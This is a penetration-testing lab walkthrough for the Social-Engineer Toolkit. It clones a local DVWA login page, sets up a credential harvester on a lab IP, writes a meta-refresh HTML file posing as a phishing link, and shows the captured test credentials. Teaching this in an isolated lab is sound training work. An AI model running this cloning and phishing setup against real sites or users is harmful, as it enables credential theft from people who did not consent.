**Protego Security Solutions Task**

The SET is a very cool. We wrote a lab that will get you familiar with how to use it. You create a simulated credential harvesting attack that actually runs! Please explore more than that though. There are definitely things that you can try out that will not get you in trouble. Just use yourself as the victim! However, be careful with some of the payloads that are available to you.

Because of its depth and versatility, you really need to study it to learn everything that it can do. Our lab is a good starting point. There are a number of resources online that will walk you through various attacks and explain its features in depth. We are hoping you can find creative uses of the SET that you can use in our pentests.

In this lab, you will complete the following objectives:

- Part 1: Launching SET and exploring the toolkit
- Part 2: Cloning a website to obtain user credentials
- Part 3: Capturing and viewing user credentials

---

# Instructions

## Part 1: Launching SET and Exploring the Toolkit

### Step 1: Load the SET application.

1. Start Kali Linux using the username **kali** and the password **kali**. Open a terminal session from the menu bar at the top of the screen.
2. SET must be run as root. Use the **sudo -i** command to obtain persistent root access. At the prompt, enter the command **setoolkit** to load the SET menu system. The Social Engineering Toolkit can also be run from the **Applications >Social Engineering Tools >social engineering toolkit (root)** choice on the Kali menu.

```
sudo -i
setoolkit
```

If this is the first time that you have run SET, the license terms and conditions are displayed, and an agreement is required. Read the terms carefully.

3.  After reading the disclaimer, enter **y** to accept the terms of service.

**The Social-Engineer Toolkit is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By hitting yes (only one time), you agree to the terms of service and that you will only use this tool for lawful purposes only.**

Do you agree to the terms of service [y/n]: **y**

The initial SET menu is displayed, as shown:

### Step 2: Examine the Available Social-Engineering Attacks.

1. At the SET prompt, enter **1** and press **Enter** to access the Social-Engineering Attacks submenu.

```
set> 1

Select from the menu:
```

2. Select each option to see a brief description of each exploit and what the tool does for each.

**Note**: Some options may not have a choice. In that case, use **CTRL-C** or enter **99** to return to the main menu.


---

## Part 2: Cloning a Website to Obtain User Credentials

In this part of the lab, you will create a perfect copy of the login page for a website. The fake login page will gather all credentials submitted to it and then redirect the user to the real website.

### Step 1: Investigate Web Attack Vectors in SET.

1. From the Social-Engineering Attacks submenu, choose **2) Website Attack Vectors** to begin the web site cloning exploit.

set> **2**

2. Review the brief attack description of each type of attack.

Select **3) Credential Harvester Attack Method** from the menu. A description of the ways to configure this exploit is displayed.

### Step 2: Clone the DVWA.vm Login Screen.

In this step, you will create a cloned website that duplicates the DVWA.vm login website. The SET application creates a website hosted on your Kali Linux computer. When the target users enter their credentials in the cloned website, the credentials and the users will be redirected to the real website without being aware of the exploit. This is similar to an on-path attack.

1. In this lab, we are using the internal website hosted on the DVWA.vm virtual machine. To see what the website looks like, open the Kali Firefox browser, and enter the URL **http://DVWA.vm/**. The login screen will appear. If the URL is not found, enter http://10.6.6.13/ to access the web server using its IP address.

2. Return to the terminal session. Select **2) Site Cloner** from the **Credential Harvester Attack Method** menu. Information describing which IP address is needed to host the fake website and to receive the POST data is displayed. Enter the web attacker IP address at the prompt. This is the IP address of the virtual Kali internal interface on the 10.6.6.0/24 network. In an actual exploit, this would be the external (internet facing) address of the attack computer.
3. At the prompt, enter the IP address **10.6.6.1**.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.0.2.15]:**10.6.6.1**

4. Next, enter the URL of the website that you want to clone. This is the URL of the DVWA website, **http://DVWA.vm**.

[-] SET supports both HTTP and HTTPS

[-] Example: http://www.thisisafakesite.com

set:webattack> Enter the url to clone:**http://DVWA.vm** 

[*] Cloning the website: http://DVWA.vm

[*] This could take a little bit...

5. When the website is cloned, the following message appears on the terminal.

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.

[*] The Social-Engineer Toolkit Credential Harvester Attack

[*] Credential Harvester is running on port 80

[*] Information will be displayed to you as it arrives below:

**Note**: No prompt will be returned to you. This is because a listener is now active on port 80 on the Kali computer and all port 80 traffic will be redirected to this screen. Do not close the terminal window. Continue to Part 3.


## Part 3: Capturing and Viewing User Credentials

### Step 1: Create the Social Engineering Exploit.

In a “real-life” exploit, at this point, a phishing exploit containing a link or QR code that sends the user to the fake website is created and sent. In this lab, an html document is created to direct the user to the fake webpage. This document simulates a distributed phishing URL. It could be distributed as a file attachment in phishing emails.

1. Open the Kali Linux Mousepad text editor using the **Applications > Favorites > Text Editor** choice from the menu. Enter the HTML code shown into the Mousepad document.
```xml
<html>

<head>

<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />

</head>

</html>
```

2. Select **File > Save** from the Mousepad menu. Name the document **Great_link.html** and save it in the **/home/kali/Desktop** Folder. The icon appears on the Kali desktop.
3. Close the Mousepad application.

### Step 2: Capture User Credentials.

The purpose of the cloned website is to present a web page that looks identical to the one that the user is expecting. A good hacker would create a fake URL that would be very similar to the actual URL, so that unless the user inspects the URL very closely, it would go unnoticed.

1. Double-click the desktop icon for the **Great_link.html** page. The DVWA login page that you viewed in **Part 2, Step 2a** should appear in a browser window.

2. Enter some information in the Username and Password fields and click **Login** to send the form.

Username: **some.user@gmail.com**

Password: **Pa55w0rdd!**

---

### Step 3: View the Captured Information.

1. Return to the terminal session that is running the SET application. Output from the login attempt should appear, similar to what is shown:

[*] WE GOT A HIT! Printing the output:

POSSIBLE USERNAME FIELD FOUND: username=some.user@gmail.com

POSSIBLE PASSWORD FIELD FOUND: password=Pa55w0rdd!

POSSIBLE USERNAME FIELD FOUND: Login=Login

POSSIBLE USERNAME FIELD FOUND: user_token=69c0375a6ee98b96a5b643eed1e97f94

[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

2. To save the report in XML format to use in other penetration testing applications, enter **CTRL**-**C**. The report file name and path are returned. Select the path and filename and right-click to copy the selection. The filenames that are created contain the date and time the file was created in this format:

2023-04-07 17:32:55.967169.xml

Continue to enter **99** and press **enter** until you have exited setoolkit. To view the content of the XML file, you need to place the filename in double-quotes (“) because it contains spaces and special characters. Use the **cat** command to see the information that is saved. The file path shown is the default path for the lab VM when this lab was created.

```
cat /root/.set/reports/”2023-04-07 17:32:55.967169.xml”
```

```xml
<?xml version=”1.0” encoding=”UTF-8”?>

<harvester>

   URL=http://DVWA.vm

   <url>      <param>username=some.user@gmail.com</param>

      <param>password=Pa55w0rdd!</param>

      <param>Login=Login</param>

      <param>user_token=69c0375a6ee98b96a5b643eed1e97f94</param>

   </url>

</harvester>
```

